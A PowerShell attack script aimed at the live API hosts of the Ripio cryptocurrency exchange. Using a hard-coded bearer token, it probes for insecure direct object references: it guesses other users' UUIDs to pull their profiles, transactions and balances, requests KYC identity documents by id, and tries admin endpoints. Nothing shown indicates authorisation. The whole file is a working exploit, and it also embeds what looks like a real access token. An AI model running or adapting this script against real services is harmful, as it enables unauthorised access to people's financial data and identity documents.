$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzY0NjEyMzc1LCJpYXQiOjE3NjQ2MTA0NDQsImp0aSI6IjdjOWY0MmFmNDJiZTQwMDRiNjc3NGU5ZDNiMmRmMzU4IiwidXNlcl91c2VyX3V1aWQiOiI2OTFlMjEzNi00OGJiLTRlNTUtOTMxOC1hNTk0YWM5YzNjZWMiLCJwcml2YXRlIjoiZ0FBQUFBQnBMZEdNazdFbnhLc3VtN2VkLXMxZlVvN3Y2Wld1UTVnTzlodHh6anJKMC1VX0RtSW1abVFwVldic0xqYWlRRTRDVE9IZ2E5dnRaSW5RT1paamFGZnZJVmJtRDVqcmFZbHRLZXpESGJqQ1A5bjhvU0RCTnRnaWhpOVBzRkZ6S1ZuZHR5Qndfakl5dVJPZDl2NDV5NUJRUG4wNlMxYVpNSWJBUDlZY20zVEp5SlU2ME42b3JwTW1uT2RzT19yR25EdXhhZEpiNjZVbXhiX0FGS2xBRTM5dnJieVVZcU05Mkl5V2N2UVFCVTAycXl5RWVVZUhaaEE0eGRiMVg0WUxSd2J4Z253dkRlTkh2Nnl2ZUNDWFM4cTV3ZHM0ZUw2a090eXkzNjVKbEtnRVdlUFc4XzBzazN1THJ0NWRDX2xZUjF3LXNOcjMiLCJ1YV9oYXNoIjoiZ0FBQUFBQnBMZEdNUE02VlNMTHlDM2ZMN2Y1QjNmeFkxSHVIamVpRjd3QUpKNms5YzR6WGpHLXR5V09iUjlvLTFicHBBQzB0TzdpRm16RTB2WFV5clNHZ05FTUxFMGU3Y2xmTVk0cEU3MEFvdndWdVVrSTJCRmQ4eTRQamZjVE1jUDA3dVlyaGw1OVVfTUMya3hoV0Q1d2tlZ2VDRlVjV0JmeEVTSlpua0ZhSlA0NWF0c1llaUlBPSIsImJhY2siOiJSSVBJTyIsImZpbmdlcnByaW50IjoiZjNkYmVkNDIxMDFjZjkzMDkzYTQwZjIyZGJiZmYyMzJiZjVlODgzYTM1M2NkOTZiZDdlNzIwZTlhY2U0ZDU1YSIsImhhc18yZmEiOmZhbHNlLCJpc19zdGFmZiI6ZmFsc2V9.cYdqwWCziszy4sOO3zkcTobjcGpk2neQniR3bwI4BDda-Io0pCxhzM8vTWE1bIphNbuC5ZRLKkzK2kwEydXoSbfE65rLZaPN8rH_-VqVmDeuNt4uEY29V92__oArkyEtqWa4B1dtwzOL1tzid7ipPQ_6sKDcq91sGTt_pULymAJWWlUoQxEN7Dp414xG9FqB2CB5ZVNoR23sReqab4LTuNWJzNDhoWX2DJsy_AHO75n_02ikmyI6Twh2IJ5hGGEnEmRc3OG3i7UdCb5agfzsdyucl0U28bSvrKwjku8iD6h4hMRXXGBGGMxpBJamOsdyJH5zd7MEnwx-NmxxgQONyA"

$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type" = "application/json"
}

$myUUID = "691e2136-48bb-4e55-9318-a594ac9c3cec"

Write-Host "=== IDOR / ACCESS OTHER USERS DATA ===" -ForegroundColor Red

# Test accessing other user's data by UUID
Write-Host "`n[1] Testing user profile by UUID:" -ForegroundColor Yellow
$testUUIDs = @(
    "00000000-0000-0000-0000-000000000001",
    "11111111-1111-1111-1111-111111111111",
    "691e2136-48bb-4e55-9318-a594ac9c3ced"  # Similar to mine, last char different
)

foreach ($uuid in $testUUIDs) {
    try {
        $response = Invoke-RestMethod -Uri "https://auth.ripio.com/api/users/$uuid/" -Headers $headers -Method GET -ErrorAction Stop
        Write-Host "  UUID $uuid - ACCESS!" -ForegroundColor Red
        $response | ConvertTo-Json
    } catch {
        Write-Host "  UUID $uuid - $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Green
    }
}

# Test transactions endpoint with different user
Write-Host "`n[2] Testing transactions by user_uuid parameter:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/transactions/?user_uuid=11111111-1111-1111-1111-111111111111" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  IDOR in transactions!" -ForegroundColor Red
    $response | ConvertTo-Json
} catch {
    Write-Host "  Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
}

# Test balance by user
Write-Host "`n[3] Testing balance by user parameter:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://nexus.ripio.com/api/v1/balances/?user_uuid=11111111-1111-1111-1111-111111111111" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  IDOR in balances!" -ForegroundColor Red
    $response | ConvertTo-Json
} catch {
    Write-Host "  Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
}

# Test KYC documents endpoint
Write-Host "`n[4] Testing KYC documents:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://kyc-api.ripio.com/api/v2/validations/3418360/documents/" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  Documents accessible!" -ForegroundColor Green
    $response | ConvertTo-Json
} catch {
    Write-Host "  Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
}

# Test referral codes
Write-Host "`n[5] Testing public referral info:" -ForegroundColor Yellow
try {
    $response = Invoke-RestMethod -Uri "https://app.ripio.com/api/v3/referrals/" -Headers $headers -Method GET -ErrorAction Stop
    Write-Host "  Referral data:" -ForegroundColor Green
    $response | ConvertTo-Json -Depth 3
} catch {
    Write-Host "  Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Yellow
}

# Test admin endpoints
Write-Host "`n[6] Testing admin/staff endpoints:" -ForegroundColor Yellow
$adminEndpoints = @(
    "https://auth.ripio.com/api/admin/users/",
    "https://app.ripio.com/api/v3/admin/",
    "https://nexus.ripio.com/api/v1/admin/",
    "https://kyc-api.ripio.com/api/v2/admin/"
)
foreach ($ep in $adminEndpoints) {
    try {
        $response = Invoke-RestMethod -Uri $ep -Headers $headers -Method GET -ErrorAction Stop
        Write-Host "  $ep - ACCESSIBLE!" -ForegroundColor Red
    } catch {
        Write-Host "  $ep - $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Green
    }
}
